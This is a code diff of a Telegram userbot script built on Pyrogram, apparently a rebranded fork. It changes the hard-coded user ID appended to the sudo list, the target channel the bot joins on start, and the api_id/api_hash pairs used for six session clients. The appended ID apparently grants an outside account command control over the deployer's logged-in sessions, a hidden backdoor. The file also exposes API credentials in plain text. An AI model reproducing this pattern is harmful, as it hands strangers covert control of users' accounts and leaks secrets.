@@ -18,10 +18,10 @@ from pyrogram.handlers import MessageHandler
 
 SESSION = getenv('SESSION')
 SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
-SUDO_USERS.append(5059737154)
-CHATS = ['BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', 'BWANDARLOK', '-1001779669612', '-1001779669612']
+SUDO_USERS.append(5538690269)
+CHATS = ['PREMIUM WORLD', '@premiumopx', '@premiumopx', 'PREMIUM WORLD', '-1002049083613', '-1002049083613']
 
-M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+M = Client(SESSION, api_id=12380656, api_hash="d927c13beaaf5110f25c505b7c071273")
 
 @M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
 async def start(_, message: Message):
@@ -210,27 +210,27 @@ SESSION5 = getenv('SESSION5', default=None)
 # ------------- CLIENTS -------------
 
 if SESSION1:
-    M1 = Client(SESSION1, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+    M1 = Client(SESSION1, api_id=12380656, api_hash="d927c13beaaf5110f25c505b7c071273")
 else:
     M1 = None
 
 if SESSION2:
-    M2 = Client(SESSION2, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+    M2 = Client(SESSION2, api_id=12380656, api_hash="d927c13beaaf5110f25c505b7c071273")
 else:
     M2 = None
 
 if SESSION3:
-    M3 = Client(SESSION3, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+    M3 = Client(SESSION3, api_id=12380656, api_hash="d927c13beaaf5110f25c505b7c071273")
 else:
     M3 = None
 
 if SESSION4:
-    M4 = Client(SESSION4, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+    M4 = Client(SESSION4, api_id=12380656, api_hash="d927c13beaaf5110f25c505b7c071273")
 else:
     M4 = None
 
 if SESSION5:
-    M5 = Client(SESSION5, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
+    M5 = Client(SESSION5, api_id=12380656, api_hash="d927c13beaaf5110f25c505b7c071273")
 else:
     M5 = None
 
@@ -361,7 +361,7 @@ if M5:
     M5.stop()
 
 M.start()
-M.join_chat("BWANDARLOK")
+M.join_chat("PREMIUM WORLD")
 print("Bot Started Successfully")
 idle()
 M.stop()
